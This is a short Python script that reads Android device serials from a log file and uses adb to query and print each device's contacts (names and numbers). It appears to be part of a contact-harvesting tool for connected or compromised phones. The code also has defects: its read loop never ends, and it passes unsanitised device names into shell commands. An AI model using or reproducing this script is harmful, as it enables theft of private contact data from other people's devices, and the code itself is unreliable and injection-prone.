import os

def main():
    if os.path.isfile("logs/online.log"):
        os.system("cp -r logs/online.log on.log;sed -i 's/online//g;s/[[:space:]]//g' on.log")
        a = open("on.log","r")
        while True:
            a1 = a.readline().strip()
            if not a:
                break
            os.system("adb -s "+a1+" shell content query --uri content://contacts/phones/ --projection display_name:number")
        a.close()
    else:
        print("Failed to get contact")

main()